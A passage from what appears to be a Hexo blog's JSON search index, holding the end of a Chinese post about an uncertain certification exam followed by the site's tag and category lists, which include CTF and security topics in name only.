对于我本人来说，这次考证非常悬，因为第一场理论的知识点我根本没有背过，就真的纯靠蒙了。唯一擅长的操作题又不给文档，也有大几率遇到不会的、没想到的方法。总而言之就是： 备不足，尽人事、听天命。 我的直觉是，明年再见！","link":"/post/54367.html"}],"tags":[{"name":"运维","slug":"运维","link":"/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Laravel","slug":"Laravel","link":"/tags/Laravel/"},{"name":"编程","slug":"编程","link":"/tags/%E7%BC%96%E7%A8%8B/"},{"name":"笔记","slug":"笔记","link":"/tags/%E7%AC%94%E8%AE%B0/"},{"name":"ThinkPHP","slug":"ThinkPHP","link":"/tags/ThinkPHP/"},{"name":"博客","slug":"博客","link":"/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"工具","slug":"工具","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"VMware","slug":"VMware","link":"/tags/VMware/"},{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"next","slug":"next","link":"/tags/next/"},{"name":"Nginx","slug":"Nginx","link":"/tags/Nginx/"},{"name":"科学上网","slug":"科学上网","link":"/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"SwitchyOmega","slug":"SwitchyOmega","link":"/tags/SwitchyOmega/"},{"name":"Vs Code","slug":"Vs-Code","link":"/tags/Vs-Code/"},{"name":"npm","slug":"npm","link":"/tags/npm/"},{"name":"composer","slug":"composer","link":"/tags/composer/"},{"name":"微信小程序","slug":"微信小程序","link":"/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"信息安全","slug":"信息安全","link":"/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"ctf-web-入门","slug":"ctf-web-入门","link":"/tags/ctf-web-%E5%85%A5%E9%97%A8/"},{"name":"碎碎念","slug":"碎碎念","link":"/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"GitHub","slug":"GitHub","link":"/tags/GitHub/"},{"name":"后端","slug":"后端","link":"/tags/%E5%90%8E%E7%AB%AF/"},{"name":"考证","slug":"考证","link":"/tags/%E8%80%83%E8%AF%81/"}],"categories":[{"name":"oam","slug":"oam","link":"/categories/oam/"},{"name":"php","slug":"php","link":"/categories/php/"},{"name":"mix","slug":"mix","link":"/categories/mix/"},{"name":"tool","slug":"tool","link":"/categories/tool/"},{"name":"js","slug":"js","link":"/categories/js/"},{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"broken","slug":"broken","link":"/categories/broken/"}]}